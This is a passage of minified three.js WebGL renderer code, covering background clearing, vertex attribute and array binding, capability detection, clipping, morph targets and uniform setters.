                h = null;

            function d(e, t) { n.buffers.color.setClear(e.r, e.g, e.b, t, r) }
            return {
                getClearColor: function() { return a },
                setClearColor: function(e, t = 1) { a.set(e), l = t, d(a, l) },
                getClearAlpha: function() { return l },
                setClearAlpha: function(e) { l = e, d(a, l) },
                render: function(n, r, p, f) {
                    let m = !0 === r.isScene ? r.background : null;
                    m && m.isTexture && (m = t.get(m));
                    const g = e.xr,
                        v = g.getSession && g.getSession();
                    v && "additive" === v.environmentBlendMode && (m = null), null === m ? d(a, l) : m && m.isColor && (d(m, 1), f = !0), (e.autoClear || f) && e.clear(e.autoClearColor, e.autoClearDepth, e.autoClearStencil), m && (m.isCubeTexture || m.isWebGLCubeRenderTarget || 306 === m.mapping) ? (void 0 === s && (s = new Dn(new In(1, 1, 1), new Fn({ name: "BackgroundCubeMaterial", uniforms: On(ei.cube.uniforms), vertexShader: ei.cube.vertexShader, fragmentShader: ei.cube.fragmentShader, side: 1, depthTest: !1, depthWrite: !1, fog: !1 })), s.geometry.deleteAttribute("normal"), s.geometry.deleteAttribute("uv"), s.onBeforeRender = function(e, t, n) { this.matrixWorld.copyPosition(n.matrixWorld) }, Object.defineProperty(s.material, "envMap", { get: function() { return this.uniforms.envMap.value } }), i.update(s)), m.isWebGLCubeRenderTarget && (m = m.texture), s.material.uniforms.envMap.value = m, s.material.uniforms.flipEnvMap.value = m.isCubeTexture && m._needsFlipEnvMap ? -1 : 1, c === m && u === m.version && h === e.toneMapping || (s.material.needsUpdate = !0, c = m, u = m.version, h = e.toneMapping), n.unshift(s, s.geometry, s.material, 0, 0, null)) : m && m.isTexture && (void 0 === o && (o = new Dn(new Kn(2, 2), new Fn({ name: "BackgroundMaterial", uniforms: On(ei.background.uniforms), vertexShader: ei.background.vertexShader, fragmentShader: ei.background.fragmentShader, side: 0, depthTest: !1, depthWrite: !1, fog: !1 })), o.geometry.deleteAttribute("normal"), Object.defineProperty(o.material, "map", { get: function() { return this.uniforms.t2D.value } }), i.update(o)), o.material.uniforms.t2D.value = m, !0 === m.matrixAutoUpdate && m.updateMatrix(), o.material.uniforms.uvTransform.value.copy(m.matrix), c === m && u === m.version && h === e.toneMapping || (o.material.needsUpdate = !0, c = m, u = m.version, h = e.toneMapping), n.unshift(o, o.geometry, o.material, 0, 0, null))
                }
            }
        }

        function ni(e, t, n, i) {
            const r = e.getParameter(34921),
                a = i.isWebGL2 ? null : t.get("OES_vertex_array_object"),
                o = i.isWebGL2 || null !== a,
                s = {},
                l = d(null);
            let c = l;

            function u(t) { return i.isWebGL2 ? e.bindVertexArray(t) : a.bindVertexArrayOES(t) }

            function h(t) { return i.isWebGL2 ? e.deleteVertexArray(t) : a.deleteVertexArrayOES(t) }

            function d(e) {
                const t = [],
                    n = [],
                    i = [];
                for (let e = 0; e < r; e++) t[e] = 0, n[e] = 0, i[e] = 0;
                return { geometry: null, program: null, wireframe: !1, newAttributes: t, enabledAttributes: n, attributeDivisors: i, object: e, attributes: {}, index: null }
            }

            function p() { const e = c.newAttributes; for (let t = 0, n = e.length; t < n; t++) e[t] = 0 }

            function f(e) { m(e, 0) }

            function m(n, r) {
                const a = c.newAttributes,
                    o = c.enabledAttributes,
                    s = c.attributeDivisors;
                a[n] = 1, 0 === o[n] && (e.enableVertexAttribArray(n), o[n] = 1), s[n] !== r && ((i.isWebGL2 ? e : t.get("ANGLE_instanced_arrays"))[i.isWebGL2 ? "vertexAttribDivisor" : "vertexAttribDivisorANGLE"](n, r), s[n] = r)
            }

            function g() {
                const t = c.newAttributes,
                    n = c.enabledAttributes;
                for (let i = 0, r = n.length; i < r; i++) n[i] !== t[i] && (e.disableVertexAttribArray(i), n[i] = 0)
            }

            function v(t, n, r, a, o, s) {!0 !== i.isWebGL2 || 5124 !== r && 5125 !== r ? e.vertexAttribPointer(t, n, r, a, o, s) : e.vertexAttribIPointer(t, n, r, o, s) }

            function y() { x(), c !== l && (c = l, u(c.object)) }

            function x() { l.geometry = null, l.program = null, l.wireframe = !1 }
            return {
                setup: function(r, l, h, y, x) {
                    let _ = !1;
                    if (o) {
                        const t = function(t, n, r) {
                            const o = !0 === r.wireframe;
                            let l = s[t.id];
                            void 0 === l && (l = {}, s[t.id] = l);
                            let c = l[n.id];
                            void 0 === c && (c = {}, l[n.id] = c);
                            let u = c[o];
                            return void 0 === u && (u = d(i.isWebGL2 ? e.createVertexArray() : a.createVertexArrayOES()), c[o] = u), u
                        }(y, h, l);
                        c !== t && (c = t, u(c.object)), _ = function(e, t) {
                            const n = c.attributes,
                                i = e.attributes;
                            let r = 0;
                            for (const e in i) {
                                const t = n[e],
                                    a = i[e];
                                if (void 0 === t) return !0;
                                if (t.attribute !== a) return !0;
                                if (t.data !== a.data) return !0;
                                r++
                            }
                            return c.attributesNum !== r || c.index !== t
                        }(y, x), _ && function(e, t) {
                            const n = {},
                                i = e.attributes;
                            let r = 0;
                            for (const e in i) {
                                const t = i[e],
                                    a = {};
                                a.attribute = t, t.data && (a.data = t.data), n[e] = a, r++
                            }
                            c.attributes = n, c.attributesNum = r, c.index = t
                        }(y, x)
                    } else {
                        const e = !0 === l.wireframe;
                        c.geometry === y.id && c.program === h.id && c.wireframe === e || (c.geometry = y.id, c.program = h.id, c.wireframe = e, _ = !0)
                    }!0 === r.isInstancedMesh && (_ = !0), null !== x && n.update(x, 34963), _ && (function(r, a, o, s) {
                        if (!1 === i.isWebGL2 && (r.isInstancedMesh || s.isInstancedBufferGeometry) && null === t.get("ANGLE_instanced_arrays")) return;
                        p();
                        const l = s.attributes,
                            c = o.getAttributes(),
                            u = a.defaultAttributeValues;
                        for (const t in c) {
                            const i = c[t];
                            if (i >= 0) {
                                const a = l[t];
                                if (void 0 !== a) {
                                    const t = a.normalized,
                                        r = a.itemSize,
                                        o = n.get(a);
                                    if (void 0 === o) continue;
                                    const l = o.buffer,
                                        c = o.type,
                                        u = o.bytesPerElement;
                                    if (a.isInterleavedBufferAttribute) {
                                        const n = a.data,
                                            o = n.stride,
                                            h = a.offset;
                                        n && n.isInstancedInterleavedBuffer ? (m(i, n.meshPerAttribute), void 0 === s._maxInstanceCount && (s._maxInstanceCount = n.meshPerAttribute * n.count)) : f(i), e.bindBuffer(34962, l), v(i, r, c, t, o * u, h * u)
                                    } else a.isInstancedBufferAttribute ? (m(i, a.meshPerAttribute), void 0 === s._maxInstanceCount && (s._maxInstanceCount = a.meshPerAttribute * a.count)) : f(i), e.bindBuffer(34962, l), v(i, r, c, t, 0, 0)
                                } else if ("instanceMatrix" === t) {
                                    const t = n.get(r.instanceMatrix);
                                    if (void 0 === t) continue;
                                    const a = t.buffer,
                                        o = t.type;
                                    m(i + 0, 1), m(i + 1, 1), m(i + 2, 1), m(i + 3, 1), e.bindBuffer(34962, a), e.vertexAttribPointer(i + 0, 4, o, !1, 64, 0), e.vertexAttribPointer(i + 1, 4, o, !1, 64, 16), e.vertexAttribPointer(i + 2, 4, o, !1, 64, 32), e.vertexAttribPointer(i + 3, 4, o, !1, 64, 48)
                                } else if ("instanceColor" === t) {
                                    const t = n.get(r.instanceColor);
                                    if (void 0 === t) continue;
                                    const a = t.buffer,
                                        o = t.type;
                                    m(i, 1), e.bindBuffer(34962, a), e.vertexAttribPointer(i, 3, o, !1, 12, 0)
                                } else if (void 0 !== u) {
                                    const n = u[t];
                                    if (void 0 !== n) switch (n.length) {
                                        case 2:
                                            e.vertexAttrib2fv(i, n);
                                            break;
                                        case 3:
                                            e.vertexAttrib3fv(i, n);
                                            break;
                                        case 4:
                                            e.vertexAttrib4fv(i, n);
                                            break;
                                        default:
                                            e.vertexAttrib1fv(i, n)
                                    }
                                }
                            }
                        }
                        g()
                    }(r, l, h, y), null !== x && e.bindBuffer(34963, n.get(x).buffer))
                },
                reset: y,
                resetDefaultState: x,
                dispose: function() {
                    y();
                    for (const e in s) {
                        const t = s[e];
                        for (const e in t) {
                            const n = t[e];
                            for (const e in n) h(n[e].object), delete n[e];
                            delete t[e]
                        }
                        delete s[e]
                    }
                },
                releaseStatesOfGeometry: function(e) {
                    if (void 0 === s[e.id]) return;
                    const t = s[e.id];
                    for (const e in t) {
                        const n = t[e];
                        for (const e in n) h(n[e].object), delete n[e];
                        delete t[e]
                    }
                    delete s[e.id]
                },
                releaseStatesOfProgram: function(e) {
                    for (const t in s) {
                        const n = s[t];
                        if (void 0 === n[e.id]) continue;
                        const i = n[e.id];
                        for (const e in i) h(i[e].object), delete i[e];
                        delete n[e.id]
                    }
                },
                initAttributes: p,
                enableAttribute: f,
                disableUnusedAttributes: g
            }
        }

        function ii(e, t, n, i) {
            const r = i.isWebGL2;
            let a;
            this.setMode = function(e) { a = e }, this.render = function(t, i) { e.drawArrays(a, t, i), n.update(i, a, 1) }, this.renderInstances = function(i, o, s) {
                if (0 === s) return;
                let l, c;
                if (r) l = e, c = "drawArraysInstanced";
                else if (l = t.get("ANGLE_instanced_arrays"), c = "drawArraysInstancedANGLE", null === l) return void console.error("THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");
                l[c](a, i, o, s), n.update(o, a, s)
            }
        }

        function ri(e, t, n) {
            let i;

            function r(t) {
                if ("highp" === t) {
                    if (e.getShaderPrecisionFormat(35633, 36338).precision > 0 && e.getShaderPrecisionFormat(35632, 36338).precision > 0) return "highp";
                    t = "mediump"
                }
                return "mediump" === t && e.getShaderPrecisionFormat(35633, 36337).precision > 0 && e.getShaderPrecisionFormat(35632, 36337).precision > 0 ? "mediump" : "lowp"
            }
            const a = "undefined" != typeof WebGL2RenderingContext && e instanceof WebGL2RenderingContext || "undefined" != typeof WebGL2ComputeRenderingContext && e instanceof WebGL2ComputeRenderingContext;
            let o = void 0 !== n.precision ? n.precision : "highp";
            const s = r(o);
            s !== o && (console.warn("THREE.WebGLRenderer:", o, "not supported, using", s, "instead."), o = s);
            const l = !0 === n.logarithmicDepthBuffer,
                c = e.getParameter(34930),
                u = e.getParameter(35660),
                h = e.getParameter(3379),
                d = e.getParameter(34076),
                p = e.getParameter(34921),
                f = e.getParameter(36347),
                m = e.getParameter(36348),
                g = e.getParameter(36349),
                v = u > 0,
                y = a || t.has("OES_texture_float");
            return {
                isWebGL2: a,
                getMaxAnisotropy: function() {
                    if (void 0 !== i) return i;
                    if (!0 === t.has("EXT_texture_filter_anisotropic")) {
                        const n = t.get("EXT_texture_filter_anisotropic");
                        i = e.getParameter(n.MAX_TEXTURE_MAX_ANISOTROPY_EXT)
                    } else i = 0;
                    return i
                },
                getMaxPrecision: r,
                precision: o,
                logarithmicDepthBuffer: l,
                maxTextures: c,
                maxVertexTextures: u,
                maxTextureSize: h,
                maxCubemapSize: d,
                maxAttributes: p,
                maxVertexUniforms: f,
                maxVaryings: m,
                maxFragmentUniforms: g,
                vertexTextures: v,
                floatFragmentTextures: y,
                floatVertexTextures: v && y,
                maxSamples: a ? e.getParameter(36183) : 0
            }
        }

        function ai(e) {
            const t = this;
            let n = null,
                i = 0,
                r = !1,
                a = !1;
            const o = new Tt,
                s = new de,
                l = { value: null, needsUpdate: !1 };

            function c() { l.value !== n && (l.value = n, l.needsUpdate = i > 0), t.numPlanes = i, t.numIntersection = 0 }

            function u(e, n, i, r) {
                const a = null !== e ? e.length : 0;
                let c = null;
                if (0 !== a) {
                    if (c = l.value, !0 !== r || null === c) {
                        const t = i + 4 * a,
                            r = n.matrixWorldInverse;
                        s.getNormalMatrix(r), (null === c || c.length < t) && (c = new Float32Array(t));
                        for (let t = 0, n = i; t !== a; ++t, n += 4) o.copy(e[t]).applyMatrix4(r, s), o.normal.toArray(c, n), c[n + 3] = o.constant
                    }
                    l.value = c, l.needsUpdate = !0
                }
                return t.numPlanes = a, t.numIntersection = 0, c
            }
            this.uniform = l, this.numPlanes = 0, this.numIntersection = 0, this.init = function(e, t, a) { const o = 0 !== e.length || t || 0 !== i || r; return r = t, n = u(e, a, 0), i = e.length, o }, this.beginShadows = function() { a = !0, u(null) }, this.endShadows = function() { a = !1, c() }, this.setState = function(t, o, s) {
                const h = t.clippingPlanes,
                    d = t.clipIntersection,
                    p = t.clipShadows,
                    f = e.get(t);
                if (!r || null === h || 0 === h.length || a && !p) a ? u(null) : c();
                else {
                    const e = a ? 0 : i,
                        t = 4 * e;
                    let r = f.clippingState || null;
                    l.value = r, r = u(h, o, t, s);
                    for (let e = 0; e !== t; ++e) r[e] = n[e];
                    f.clippingState = r, this.numIntersection = d ? this.numPlanes : 0, this.numPlanes += e
                }
            }
        }

        function oi(e) {
            let t = new WeakMap;

            function n(e, t) { return 303 === t ? e.mapping = 301 : 304 === t && (e.mapping = 302), e }

            function i(e) {
                const n = e.target;
                n.removeEventListener("dispose", i);
                const r = t.get(n);
                void 0 !== r && (t.delete(n), r.dispose())
            }
            return {
                get: function(r) {
                    if (r && r.isTexture) {
                        const a = r.mapping;
                        if (303 === a || 304 === a) {
                            if (t.has(r)) return n(t.get(r).texture, r.mapping); {
                                const a = r.image;
                                if (a && a.height > 0) {
                                    const o = e.getRenderTarget(),
                                        s = new Wn(a.height / 2);
                                    return s.fromEquirectangularTexture(e, r), t.set(r, s), e.setRenderTarget(o), r.addEventListener("dispose", i), n(s.texture, r.mapping)
                                }
                                return null
                            }
                        }
                    }
                    return r
                },
                dispose: function() { t = new WeakMap }
            }
        }

        function si(e) {
            const t = {};

            function n(n) {
                if (void 0 !== t[n]) return t[n];
                let i;
                switch (n) {
                    case "WEBGL_depth_texture":
                        i = e.getExtension("WEBGL_depth_texture") || e.getExtension("MOZ_WEBGL_depth_texture") || e.getExtension("WEBKIT_WEBGL_depth_texture");
                        break;
                    case "EXT_texture_filter_anisotropic":
                        i = e.getExtension("EXT_texture_filter_anisotropic") || e.getExtension("MOZ_EXT_texture_filter_anisotropic") || e.getExtension("WEBKIT_EXT_texture_filter_anisotropic");
                        break;
                    case "WEBGL_compressed_texture_s3tc":
                        i = e.getExtension("WEBGL_compressed_texture_s3tc") || e.getExtension("MOZ_WEBGL_compressed_texture_s3tc") || e.getExtension("WEBKIT_WEBGL_compressed_texture_s3tc");
                        break;
                    case "WEBGL_compressed_texture_pvrtc":
                        i = e.getExtension("WEBGL_compressed_texture_pvrtc") || e.getExtension("WEBKIT_WEBGL_compressed_texture_pvrtc");
                        break;
                    default:
                        i = e.getExtension(n)
                }
                return t[n] = i, i
            }
            return { has: function(e) { return null !== n(e) }, init: function(e) { e.isWebGL2 ? n("EXT_color_buffer_float") : (n("WEBGL_depth_texture"), n("OES_texture_float"), n("OES_texture_half_float"), n("OES_texture_half_float_linear"), n("OES_standard_derivatives"), n("OES_element_index_uint"), n("OES_vertex_array_object"), n("ANGLE_instanced_arrays")), n("OES_texture_float_linear"), n("EXT_color_buffer_half_float") }, get: function(e) { const t = n(e); return null === t && console.warn("THREE.WebGLRenderer: " + e + " extension not supported."), t } }
        }

        function li(e, t, n, i) {
            const r = {},
                a = new WeakMap;

            function o(e) {
                const s = e.target;
                null !== s.index && t.remove(s.index);
                for (const e in s.attributes) t.remove(s.attributes[e]);
                s.removeEventListener("dispose", o), delete r[s.id];
                const l = a.get(s);
                l && (t.remove(l), a.delete(s)), i.releaseStatesOfGeometry(s), !0 === s.isInstancedBufferGeometry && delete s._maxInstanceCount, n.memory.geometries--
            }

            function s(e) {
                const n = [],
                    i = e.index,
                    r = e.attributes.position;
                let o = 0;
                if (null !== i) {
                    const e = i.array;
                    o = i.version;
                    for (let t = 0, i = e.length; t < i; t += 3) {
                        const i = e[t + 0],
                            r = e[t + 1],
                            a = e[t + 2];
                        n.push(i, r, r, a, a, i)
                    }
                } else {
                    const e = r.array;
                    o = r.version;
                    for (let t = 0, i = e.length / 3 - 1; t < i; t += 3) {
                        const e = t + 0,
                            i = t + 1,
                            r = t + 2;
                        n.push(e, i, i, r, r, e)
                    }
                }
                const s = new(on(n) > 65535 ? tn : Qt)(n, 1);
                s.version = o;
                const l = a.get(e);
                l && t.remove(l), a.set(e, s)
            }
            return {
                get: function(e, t) { return !0 === r[t.id] || (t.addEventListener("dispose", o), r[t.id] = !0, n.memory.geometries++), t },
                update: function(e) { const n = e.attributes; for (const e in n) t.update(n[e], 34962); const i = e.morphAttributes; for (const e in i) { const n = i[e]; for (let e = 0, i = n.length; e < i; e++) t.update(n[e], 34962) } },
                getWireframeAttribute: function(e) {
                    const t = a.get(e);
                    if (t) {
                        const n = e.index;
                        null !== n && t.version < n.version && s(e)
                    } else s(e);
                    return a.get(e)
                }
            }
        }

        function ci(e, t, n, i) {
            const r = i.isWebGL2;
            let a, o, s;
            this.setMode = function(e) { a = e }, this.setIndex = function(e) { o = e.type, s = e.bytesPerElement }, this.render = function(t, i) { e.drawElements(a, i, o, t * s), n.update(i, a, 1) }, this.renderInstances = function(i, l, c) {
                if (0 === c) return;
                let u, h;
                if (r) u = e, h = "drawElementsInstanced";
                else if (u = t.get("ANGLE_instanced_arrays"), h = "drawElementsInstancedANGLE", null === u) return void console.error("THREE.WebGLIndexedBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");
                u[h](a, l, o, i * s, c), n.update(l, a, c)
            }
        }

        function ui(e) {
            const t = { frame: 0, calls: 0, triangles: 0, points: 0, lines: 0 };
            return {
                memory: { geometries: 0, textures: 0 },
                render: t,
                programs: null,
                autoReset: !0,
                reset: function() { t.frame++, t.calls = 0, t.triangles = 0, t.points = 0, t.lines = 0 },
                update: function(e, n, i) {
                    switch (t.calls++, n) {
                        case 4:
                            t.triangles += i * (e / 3);
                            break;
                        case 1:
                            t.lines += i * (e / 2);
                            break;
                        case 3:
                            t.lines += i * (e - 1);
                            break;
                        case 2:
                            t.lines += i * e;
                            break;
                        case 0:
                            t.points += i * e;
                            break;
                        default:
                            console.error("THREE.WebGLInfo: Unknown draw mode:", n)
                    }
                }
            }
        }

        function hi(e, t) { return e[0] - t[0] }

        function di(e, t) { return Math.abs(t[1]) - Math.abs(e[1]) }

        function pi(e) {
            const t = {},
                n = new Float32Array(8),
                i = [];
            for (let e = 0; e < 8; e++) i[e] = [e, 0];
            return {
                update: function(r, a, o, s) {
                    const l = r.morphTargetInfluences,
                        c = void 0 === l ? 0 : l.length;
                    let u = t[a.id];
                    if (void 0 === u) {
                        u = [];
                        for (let e = 0; e < c; e++) u[e] = [e, 0];
                        t[a.id] = u
                    }
                    for (let e = 0; e < c; e++) {
                        const t = u[e];
                        t[0] = e, t[1] = l[e]
                    }
                    u.sort(di);
                    for (let e = 0; e < 8; e++) e < c && u[e][1] ? (i[e][0] = u[e][0], i[e][1] = u[e][1]) : (i[e][0] = Number.MAX_SAFE_INTEGER, i[e][1] = 0);
                    i.sort(hi);
                    const h = o.morphTargets && a.morphAttributes.position,
                        d = o.morphNormals && a.morphAttributes.normal;
                    let p = 0;
                    for (let e = 0; e < 8; e++) {
                        const t = i[e],
                            r = t[0],
                            o = t[1];
                        r !== Number.MAX_SAFE_INTEGER && o ? (h && a.getAttribute("morphTarget" + e) !== h[r] && a.setAttribute("morphTarget" + e, h[r]), d && a.getAttribute("morphNormal" + e) !== d[r] && a.setAttribute("morphNormal" + e, d[r]), n[e] = o, p += o) : (h && !0 === a.hasAttribute("morphTarget" + e) && a.deleteAttribute("morphTarget" + e), d && !0 === a.hasAttribute("morphNormal" + e) && a.deleteAttribute("morphNormal" + e), n[e] = 0)
                    }
                    const f = a.morphTargetsRelative ? 1 : 1 - p;
                    s.getUniforms().setValue(e, "morphTargetBaseInfluence", f), s.getUniforms().setValue(e, "morphTargetInfluences", n)
                }
            }
        }

        function fi(e, t, n, i) {
            let r = new WeakMap;

            function a(e) {
                const t = e.target;
                t.removeEventListener("dispose", a), n.remove(t.instanceMatrix), null !== t.instanceColor && n.remove(t.instanceColor)
            }
            return {
                update: function(e) {
                    const o = i.render.frame,
                        s = e.geometry,
                        l = t.get(e, s);
                    return r.get(l) !== o && (t.update(l), r.set(l, o)), e.isInstancedMesh && (!1 === e.hasEventListener("dispose", a) && e.addEventListener("dispose", a), n.update(e.instanceMatrix, 34962), null !== e.instanceColor && n.update(e.instanceColor, 34962)), l
                },
                dispose: function() { r = new WeakMap }
            }
        }
        ei.physical = { uniforms: Hn([ei.standard.uniforms, { clearcoat: { value: 0 }, clearcoatMap: { value: null }, clearcoatRoughness: { value: 0 }, clearcoatRoughnessMap: { value: null }, clearcoatNormalScale: { value: new he(1, 1) }, clearcoatNormalMap: { value: null }, sheen: { value: new Wt(0) }, transmission: { value: 0 }, transmissionMap: { value: null } }]), vertexShader: $n.meshphysical_vert, fragmentShader: $n.meshphysical_frag };
        class mi extends ge { constructor(e = null, t = 1, n = 1, i = 1) { super(null), this.image = { data: e, width: t, height: n, depth: i }, this.magFilter = U, this.minFilter = U, this.wrapR = O, this.generateMipmaps = !1, this.flipY = !1, this.needsUpdate = !0 } }
        mi.prototype.isDataTexture2DArray = !0;
        class gi extends ge { constructor(e = null, t = 1, n = 1, i = 1) { super(null), this.image = { data: e, width: t, height: n, depth: i }, this.magFilter = U, this.minFilter = U, this.wrapR = O, this.generateMipmaps = !1, this.flipY = !1, this.needsUpdate = !0 } }
        gi.prototype.isDataTexture3D = !0;
        const vi = new ge,
            yi = new mi,
            xi = new gi,
            _i = new Vn,
            bi = [],
            wi = [],
            Mi = new Float32Array(16),
            Ti = new Float32Array(9),
            Ei = new Float32Array(4);

        function Si(e, t, n) { const i = e[0]; if (i <= 0 || i > 0) return e; const r = t * n; let a = bi[r]; if (void 0 === a && (a = new Float32Array(r), bi[r] = a), 0 !== t) { i.toArray(a, 0); for (let i = 1, r = 0; i !== t; ++i) r += n, e[i].toArray(a, r) } return a }

        function Li(e, t) {
            if (e.length !== t.length) return !1;
            for (let n = 0, i = e.length; n < i; n++)
                if (e[n] !== t[n]) return !1;
            return !0
        }

        function Ai(e, t) { for (let n = 0, i = t.length; n < i; n++) e[n] = t[n] }

        function Ri(e, t) {
            let n = wi[t];
            void 0 === n && (n = new Int32Array(t), wi[t] = n);
            for (let i = 0; i !== t; ++i) n[i] = e.allocateTextureUnit();
            return n
        }

        function Pi(e, t) {
            const n = this.cache;
            n[0] !== t && (e.uniform1f(this.addr, t), n[0] = t)
        }

        function Ci(e, t) {
            const n = this.cache;
            if (void 0 !== t.x) n[0] === t.x && n[1] === t.y || (e.uniform2f(this.addr, t.x, t.y), n[0] = t.x, n[1] = t.y);
            else {
                if (Li(n, t)) return;
                e.uniform2fv(this.addr, t), Ai(n, t)
            }
        }

        function Di(e, t) {
            const n = this.cache;
            if (void 0 !== t.x) n[0] === t.x && n[1] === t.y && n[2] === t.z || (e.uniform3f(this.addr, t.x, t.y, t.z), n[0] = t.x, n[1] = t.y, n[2] = t.z);
            else if (void 0 !== t.r) n[0] === t.r && n[1] === t.g && n[2] === t.b || (e.uniform3f(this.addr, t.r, t.g, t.b), n[0] = t.r, n[1] = t.g, n[2] = t.b);
            else {
                if (Li(n, t)) return;
                e.uniform3fv(this.addr, t), Ai(n, t)
            }
        }

        function Ni(e, t) {
            const n = this.cache;
            if (void 0 !== t.x) n[0] === t.x && n[1] === t.y && n[2] === t.z && n[3] === t.w || (e.uniform4f(this.addr, t.x, t.y, t.z, t.w), n[0] = t.x, n[1] = t.y, n[2] = t.z, n[3] = t.w);
            else {
                if (Li(n, t)) return;
                e.uniform4fv(this.addr, t), Ai(n, t)
            }
        }

        function Ii(e, t) {
            const n = this.cache,
                i = t.elements;
            if (void 0 === i) {
                if (Li(n, t)) return;
                e.uniformMatrix2fv(this.addr, !1, t), Ai(n, t)
            } else {
                if (Li(n, i)) return;
                Ei.set(i), e.uniformMatrix2fv(this.addr, !1, Ei), Ai(n, i)
            }
        }

        function Oi(e, t) {
            const n = this.cache,
                i = t.elements;
            if (void 0 === i) {
                if (Li(n, t)) return;
                e.uniformMatrix3fv(this.addr, !1, t), Ai(n, t)
            } else {
                if (Li(n, i)) return;
                Ti.set(i), e.uniformMatrix3fv(this.addr, !1, Ti), Ai(n, i)
            }
        }

        function Hi(e, t) {
            const n = this.cache,
                i = t.elements;
            if (void 0 === i) {
                if (Li(n, t)) return;
                e.uniformMatrix4fv(this.addr, !1, t), Ai(n, t)
            } else {
                if (Li(n, i)) return;
                Mi.set(i), e.uniformMatrix4fv(this.addr, !1, Mi), Ai(n, i)
            }
        }

        function Ui(e, t, n) {
            const i = this.cache,
                r = n.allocateTextureUnit();
            i[0] !== r && (e.uniform1i(this.addr, r), i[0] = r), n.safeSetTexture2D(t || vi, r)
        }

        function Fi(e, t, n) {
            const i = this.cache,
                r = n.allocateTextureUnit();
            i[0] !== r && (e.uniform1i(this.addr, r), i[0] = r), n.setTexture2DArray(t || yi, r)
        }

        function zi(e, t, n) {
            const i = this.cache,
                r = n.allocateTextureUnit();
            i[0] !== r && (e.uniform1i(this.addr, r), i[0] = r), n.setTexture3D(t || xi, r)
        }

        function Bi(e, t, n) {
            const i = this.cache,
                r = n.allocateTextureUnit();
            i[0] !== r && (e.uniform1i(this.addr, r), i[0] = r), n.safeSetTextureCube(t || _i, r)
        }

        function Gi(e, t) {
            const n = this.cache;
            n[0] !== t && (e.uniform1i(this.addr, t), n[0] = t)
        }

        function ki(e, t) {
            const n = this.cache;
            Li(n, t) || (e.uniform2iv(this.addr, t), Ai(n, t))
        }

        function Vi(e, t) {
            const n = this.cache;
            Li(n, t) || (e.uniform3iv(this.addr, t), Ai(n, t))
        }

        function Wi(e, t) {
            const n = this.cache;
            Li(n, t) || (e.uniform4iv(this.addr, t), Ai(n, t))
        }

        function ji(e, t) {
            const n = this.cache;
            n[0] !== t && (e.uniform1ui(this.addr, t), n[0] = t)
        }

        function qi(e, t) { e.uniform1fv(this.addr, t) }

        function Xi(e, t) { e.uniform1iv(this.addr, t) }

        function Yi(e, t) { e.uniform2iv(this.addr, t) }

        function Zi(e, t) { e.uniform3iv(this.addr, t) }

        function Ji(e, t) { e.uniform4iv(this.addr, t) }

        function Ki(e, t) {
            const n = Si(t, this.size, 2);
            e.uniform2fv(this.addr, n)
        }

        function $i(e, t) {
            const n = Si(t, this.size, 3);
            e.uniform3fv(this.addr, n)
        }

        function Qi(e, t) {
            const n = Si(t, this.size, 4);
            e.uniform4fv(this.addr, n)
        }

        function er(e, t) {
            const n = Si(t, this.size, 4);
            e.uniformMatrix2fv(this.addr, !1, n)
        }

        function tr(e, t) {
            const n = Si(t, this.size, 9);
            e.uniformMatrix3fv(this.addr, !1, n)
        }

        function nr(e, t) {
            const n = Si(t, this.size, 16);
            e.uniformMatrix4fv(this.addr, !1, n)
        }

        function ir(e, t, n) {
            const i = t.length,
                r = Ri(n, i);
            e.uniform1iv(this.addr, r);
            for (let e = 0; e !== i; ++e) n.safeSetTexture2D(t[e] || vi, r[e])
        }

        function rr(e, t, n) {
            const i = t.length,
                r = Ri(n, i);
            e.uniform1iv(this.addr, r);
            for (let e = 0; e !== i; ++e) n.safeSetTextureCube(t[e] || _i, r[e])
        }

        function ar(e, t, n) {
            this.id = e, this.addr = n, this.cache = [], this.setValue = function(e) {
                switch (e) {
                    case 5126:
                        return Pi;
                    case 35664:
                        return Ci;
                    case 35665:
                        return Di;
                    case 35666:
                        return Ni;
                    case 35674:
                        return Ii;
                    case 35675:
                        return Oi;
                    case 35676:
                        return Hi;
                    case 5124:
                    case 35670:
                        return Gi;
                    case 35667:
                    case 35671:
                        return ki;
                    case 35668:
                    case 35672:
                        return Vi;
                    case 35669:
                    case 35673:
                        return Wi;
                    case 5125:
                        return ji;
                    case 35678:
                    case 36198:
                    case 36298:
                    case 36306:
                    case 35682:
                        return Ui;
                    case 35679:
                    case 36299:
                    case 36307:
                        return zi;
                    case 35680:
                    case 36300:
                    case 36308:
                    case 36293:
                        return Bi;
                    case 36289:
                    case 36303:
                    case 36311:
                    case 36292:
                        return Fi
                }
            }(t.type)
        }

        function or(e, t, n) {
            this.id = e, this.addr = n, this.cache = [], this.size = t.size, this.setValue = function(e) {
                switch (e) {
                    case 5126:
                        return qi;
                    case 35664:
                        return Ki;
                    case 35665:
                        return $i;
                    case 35666:
                        return Qi;
                    case 35674:
                        return er;
                    case 35675:
                        return tr;
                    case 35676:
                        return nr;
                    case 5124:
                    case 35670:
                        return Xi;
                    case 35667:
                    case 35671:
                        return Yi;
                    case 35668:
                    case 35672:
                        return Zi;
                    case 35669:
                    case 35673:
                        return Ji;
                    case 35678:
                    case 36198:
                    case 36298:
                    case 36306:
                    case 35682:
                        return ir;
                    case 35680:
                    case 36300:
                    case 36308:
                    case 36293:
                        return rr
                }
            }(t.type)
        }

        function sr(e) { this.id = e, this.seq = [], this.map = {} }
        or.prototype.updateCache = function(e) {
            const t = this.cache;
            e instanceof Float32Array && t.length !== e.length && (this.cache = new Float32Array(e.length)), Ai(t, e)
        }, sr.prototype.setValue = function(e, t, n) {
            const i = this.seq;
            for (let r = 0, a = i.length; r !== a; ++r) {
                const a = i[r];
                a.setValue(e, t[a.id], n)
            }
        };
        const lr = /(\w+)(\])?(\[|\.)?/g;

        function cr(e, t) { e.seq.push(t), e.map[t.id] = t }

        function ur(e, t, n) {
            const i = e.name,
                r = i.length;
            for (lr.lastIndex = 0;;) {
                const a = lr.exec(i),
                    o = lr.lastIndex;
                let s = a[1];
                const l = "]" === a[2],
                    c = a[3];
                if (l && (s |= 0), void 0 === c || "[" === c && o + 2 === r) { cr(n, void 0 === c ? new ar(s, e, t) : new or(s, e, t)); break } {
                    let e = n.map[s];
                    void 0 === e && (e = new sr(s), cr(n, e)), n = e
                }
            }
        }

        function hr(e, t) {
            this.seq = [], this.map = {};
            const n = e.getProgramParameter(t, 35718);
            for (let i = 0; i < n; ++i) {
                const n = e.getActiveUniform(t, i);
                ur(n, e.getUniformLocation(t, n.name), this)
            }
        }

